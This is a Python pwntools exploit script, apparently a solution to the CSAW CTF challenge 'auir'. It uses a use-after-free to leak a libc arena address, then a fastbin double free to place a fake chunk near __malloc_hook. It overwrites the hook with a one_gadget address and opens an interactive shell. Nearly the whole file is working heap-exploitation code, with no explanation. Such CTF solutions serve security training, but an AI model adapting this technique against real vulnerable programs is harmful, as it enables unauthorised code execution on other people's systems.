from pwn import *

def recvall():
    c = 0
    ret = ""
    while True:
        a = r.recvline(timeout=0.1)
        if a == "":
            c += 1
        ret += a
        if c == 3:
            break
    return ret

def make(size, content):
    r.sendline("1")
    r.sendline(str(size))
    r.sendline(content)
    print recvall()

def destroy(number):
    r.sendline("2")
    r.sendline(str(number))
    print recvall()

def edit(number, size, content):
    r.sendline("3")
    r.sendline(str(number))
    r.sendline(str(size))
    r.sendline(content)
    print recvall()

def display(number):
    r.sendline("4")
    r.sendline(str(number))

r=process("./auir")
#r=remote("pwn.chal.csaw.io", 7713)

gdb.attach(r, '''
set disassembly-flavor intel
set height 0
c
b *0x402060
''')


make(200, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA") #0
make(200, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB") #1

destroy(0)
display(0)

leak = recvall()

print leak
arenaleak = 0
for a in leak.split("\n"):
    if not a.startswith("|-------------------------------|") and "|-------------------------------|" in a:
        arenaleak = a.split("|-------------------------------|")[0] + "0" * (8 - len(a.split("|-------------------------------|")[0]))
        arenaleak = struct.unpack("<Q", arenaleak)[0]

print "arenaleak", hex(arenaleak)

libc = arenaleak - 0x3c4b20 - 88

fakechunk = arenaleak - 0x8b

make(0x60, "A") #2
make(0x60, "B") #3

destroy(2)
destroy(3)
destroy(2)

make(0x60, "A") #4
make(0x60, "dummy") #5

print "Fake Chunk: {}".format(hex(fakechunk))

edit(4, 0x60, p64(fakechunk))
make(0x60, "C") #6

make(0x60, "D"*0x13 + p64(libc+0xf0274)) #RIP

print "Libc base: " + hex(libc)

recvall()
r.sendline("1")

r.interactive()
